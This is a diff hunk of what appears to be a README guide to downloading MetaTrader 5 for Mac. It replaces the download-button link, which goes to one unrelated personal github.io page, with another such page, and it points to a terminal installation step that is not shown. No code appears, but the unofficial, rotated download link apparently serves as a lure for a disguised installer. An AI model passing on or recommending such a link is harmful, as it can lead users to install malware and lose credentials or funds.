@@ -4,7 +4,7 @@
 MetaTrader 5 for Mac is a professional trading platform that gives you access to Forex, stocks, and futures directly from your macOS device 💻📈.  
 With this guide, you can easily download and install MT5 on Mac OS using a simple installer or terminal command.  
 
-[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?logo=apple&style=for-the-badge)](https://kamartamara.github.io/.github/metatrader5)
+[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/metatrader5)
 
 ⚠️ If the download button does not work, follow the terminal installation guide below.  
 
